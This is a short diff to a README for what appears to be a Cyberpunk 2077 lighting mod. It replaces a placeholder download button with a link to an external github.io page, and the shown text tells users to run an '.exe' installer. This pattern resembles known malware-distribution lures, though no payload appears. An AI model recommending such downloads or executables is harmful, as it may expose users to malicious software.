@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the installer and apply lighting enhancements automatically.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://relux-lighting-redux-cyberpunk2077.github.io/.github/)
 
 ## 📸 Overview
 ![cyberpunk-relux-lighting](https://github.com/user-attachments/assets/35489b74-f83e-4d6b-a816-e211b61e3863)
